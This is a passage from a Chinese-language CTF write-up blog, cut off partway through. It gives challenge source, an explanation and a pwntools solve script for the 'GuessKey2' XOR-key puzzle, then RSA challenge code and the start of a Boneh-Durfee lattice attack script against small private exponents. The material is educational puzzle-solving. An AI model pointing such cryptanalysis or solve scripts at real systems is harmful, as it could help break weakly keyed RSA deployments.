class="line">*CTF&#123;iMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yLuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;yOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;©HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;©IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;©JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;©KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;©LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;©MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;©NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;©OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;¹HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;¹IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;¹JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;¹KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;¹LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;¹MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;¹NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;¹OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÉHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÉIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÉJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÉKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÉLuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÉMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÉNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÉOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÙHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÙIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÙJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÙKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÙLuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÙMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÙNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ÙOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;éHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;éIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;éJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;éKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;éLuG0t1T!&#125;</span><br><span class="line">*CTF&#123;éMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;éNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;éOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ùHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ùIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ùJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ùKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ùLuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ùMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ùNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ùOuG0t1T!&#125;</span><br></pre></td></tr></table></figure><p>还好小学读过英语, 根据语义猜测flag在<code>*CTF&#123;YOuG0t1T!&#125;</code>和<code>*CTF&#123;yOuG0t1T!&#125;</code>之中</p><blockquote><p>猜猜是哪个呀</p></blockquote><h1 id="GuessKey2"><a href="#GuessKey2" class="headerlink" title="GuessKey2"></a>GuessKey2</h1><blockquote><p>关于出题人忘记把key注释掉多了一题GuessKey2那件事</p></blockquote><p>nc 52.163.228.53 8080<br>附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">N=<span class="number">64</span></span><br><span class="line">key=randint(<span class="number">0</span>,<span class="number">2</span>**N)</span><br><span class="line"><span class="built_in">print</span> key</span><br><span class="line">key=<span class="built_in">bin</span>(key)[<span class="number">2</span>:].rjust(N,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">q=<span class="number">0</span></span><br><span class="line">new_key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">zeros=[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line"><span class="keyword">if</span> key[j]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">zeros.append(j)</span><br><span class="line">p=zeros[randint(<span class="number">0</span>,<span class="built_in">len</span>(zeros))-<span class="number">1</span>]</span><br><span class="line">q=zeros[randint(<span class="number">0</span>,<span class="built_in">len</span>(zeros))-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">mask=<span class="built_in">int</span>(raw_input(<span class="string">&quot;mask:&quot;</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line">mask=<span class="built_in">bin</span>(mask)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> p&gt;q:</span><br><span class="line">tmp=q</span><br><span class="line">q=p</span><br><span class="line">p=tmp</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,N):</span><br><span class="line"><span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(p,q+<span class="number">1</span>):</span><br><span class="line">new_key+=<span class="built_in">str</span>(<span class="built_in">int</span>(mask[cnt])^<span class="built_in">int</span>(key[j]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">new_key+=key[j]</span><br><span class="line">cnt+=<span class="number">1</span></span><br><span class="line">cnt%=<span class="built_in">len</span>(mask)</span><br><span class="line">key=new_key</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">guess=<span class="built_in">int</span>(raw_input(<span class="string">&quot;guess:&quot;</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> guess==<span class="built_in">int</span>(key,<span class="number">2</span>):</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Nice.&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Oops.&#x27;</span></span><br><span class="line"><span class="keyword">if</span> count&gt;<span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>随机生成一个key, 输入mask, 每一轮都会随机的在key中取一段(开头结尾两位必定都是0), 然后与mask对应的一段异或(mask先重复填充成key长度).</p><p>题目让我们猜每一轮的key, 连续猜中3轮就能得到flag</p><p>可以看到只有输入mask才能改变key, 想到key中拿来跟mask异或的第一位必定是0, 如果最前面的0被改成了1, 那么它前面的位数和它本身就再也不会改变了, 利用这个特点, 可以疯狂传mask=1,让key的所有位数变成1, 当key变成全1之后, 传mask=0就能保持key不变了, 一直传<code>guess=int(&#39;1&#39;*64,2)</code>就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mask = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;1&#x27;</span>*<span class="number">64</span></span><br><span class="line"></span><br><span class="line">mask = <span class="built_in">str</span>(<span class="built_in">int</span>(mask,<span class="number">2</span>))</span><br><span class="line">key = <span class="built_in">str</span>(<span class="built_in">int</span>(key,<span class="number">2</span>))</span><br><span class="line">print(mask)</span><br><span class="line">print(key)</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;52.163.228.53&#x27;</span>, <span class="number">8082</span>)</span><br><span class="line">resp = con.recv().decode()</span><br><span class="line">print(resp)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    con.sendline(mask.encode())</span><br><span class="line">    resp = con.recv().decode()</span><br><span class="line">    con.sendline(key.encode())</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;mask:&#x27;</span>).decode()</span><br><span class="line">    print(resp)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;e&#x27;</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            con.sendline(<span class="string">&#x27;0&#x27;</span>.encode())</span><br><span class="line">            resp = con.recv().decode()</span><br><span class="line">            con.sendline(key.encode())</span><br><span class="line">            resp = con.recvuntil(<span class="string">&#x27;mask:&#x27;</span>).decode()</span><br><span class="line">            print(resp)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>大概跑个一两百轮?就能出结果了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*CTF&#123;27d30dad45523cbf88013674a4b5bd29&#125;</span><br></pre></td></tr></table></figure><h1 id="little-case"><a href="#little-case" class="headerlink" title="little case"></a>little case</h1><blockquote><p>总会有一道RSA的对吧?</p></blockquote><p>附件:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,special,p,q,n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">little_trick</span>(<span class="params">msg</span>):</span></span><br><span class="line">    p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n1 = p1 * q1</span><br><span class="line">    d1=random.randint(<span class="number">1</span>,<span class="number">2</span>**<span class="number">256</span>)</span><br><span class="line">    e1=inverse(d1,(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">    print(n1)</span><br><span class="line">    print(e1)</span><br><span class="line">    print(<span class="built_in">pow</span>(msg,e1,n1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">real_trick</span>():</span></span><br><span class="line">    <span class="keyword">assert</span> (special &gt; (<span class="built_in">ord</span>(<span class="string">&quot;*&quot;</span>)*<span class="number">100</span>) <span class="keyword">and</span> gcd(special,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))!=<span class="number">1</span> )</span><br><span class="line">    print(n)</span><br><span class="line">    print(<span class="built_in">pow</span>(libnum.s2n(flag),special,n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    little_trick(p-<span class="number">1</span>)</span><br><span class="line">    real_trick()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出</span></span><br><span class="line"><span class="string">21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">17653913822265292046140436077352027388518012934178497059850703004839268622175666123728756590505344279395546682262531546841391088108347695091027910544112830270722179480786859703225421972669021406495452107007154426730798752912163553332446929049057464612267870012438268458914652129391150217932076946886301294155031704279222594842585123671871118879574946424138391703308869753154497665630799300138651304835205755177940116680821142858923842124294529640719629497853598914963074656319325664210104788201957945801990296604585721820046391439235286951088086966253038989586737352467905401107613763487302070546247282406664431777475</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">22346087036331379968192118389403047568445805414881948978518580277027027486284293415097623011228506968071753709256352246733181304513713003096615266613365080909760605498017330085960699607777361429562376124376340215426398797920168016137830563564636922257215066266075494625782943973857490781916694118187094786034792437781964601089843549995939887939410763350338658901108020658475956489391300528691289604149598720803012371765770928211044755626045817053870803040863722458554924076011151695567147976903053993914859714631837755435592006986598006207692599019026644753575853382810261910332197447386727419606073948645238377595719</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>一共两个问题吧</p><ol><li>根据n1,e1以及<code>pow(p-1,e1,n1)</code>求p-1</li><li>根据上面的p, n 还有一些e有关的条件, 求flag </li></ol><h2 id="根据n1-e1以及pow-p-1-e1-n1-求p-1"><a href="#根据n1-e1以及pow-p-1-e1-n1-求p-1" class="headerlink" title="根据n1,e1以及pow(p-1,e1,n1)求p-1"></a>根据n1,e1以及<code>pow(p-1,e1,n1)</code>求p-1</h2><p>e1够大, 直接上Boneh_Durfee, 直接拿github上面的脚本跑了(不想改了….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span>(<span class="params">BB, bound</span>):</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span 